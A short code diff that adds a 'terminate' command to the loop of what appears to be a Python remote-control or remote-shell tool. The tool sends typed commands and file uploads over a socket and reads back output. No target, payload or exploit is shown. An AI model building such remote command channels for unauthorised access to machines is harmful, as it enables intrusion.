@@ -48,6 +48,11 @@ while True:
             SendData(inText)
             UploadFILE(inText.split(" ")[1])
             chunk = RecvData()
+        elif inText == "terminate":
+            SendData("terminate")
+            connstream.shutdown(socket.SHUT_RDWR)
+            connstream.close()
+            break
         else:
             connstream.write(inText)
             outTT = RecvData()
